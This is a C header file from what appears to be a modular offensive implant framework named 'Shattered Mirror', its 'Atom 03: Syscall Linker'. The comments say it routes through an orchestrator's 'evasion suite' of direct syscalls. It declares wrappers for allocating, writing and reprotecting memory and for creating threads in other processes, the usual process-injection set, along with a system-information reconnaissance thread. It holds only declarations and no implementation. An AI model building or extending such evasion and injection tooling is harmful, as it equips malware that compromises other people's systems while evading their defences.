#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 03: Syscall Linker
 *
 * This header defines lightweight syscall wrappers used exclusively by the Atoms.
 * It links back to the Orchestrator's evasion suite (SYSCALL_TABLE) so Atoms
 * do not need to contain the full scanning/resolution logic, keeping their
 * footprints microscopic.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_03_SYS_H
#define SMIRROR_ATOM_03_SYS_H

#include <windows.h>
#include <winternl.h>
#include "../Evasion_Suite/include/common.h"

/* Initialize the linker (points back to the Orchestrator's table) */
BOOL InitSyslink(void* pOrchestratorSyscallTable);

/* 
 * Lightweight Wrappers used by sibling Atoms
 * These route directly through the MASM SyscallDispatch stub provided by the Orchestrator.
 */
NTSTATUS SysAlloc(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS SysWrite(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
NTSTATUS SysProtect(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
NTSTATUS SysThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PSM_OBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PSM_PS_ATTRIBUTE_LIST AttributeList);

/* Launch System Information thread */
DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam);

#endif /* SMIRROR_ATOM_03_SYS_H */
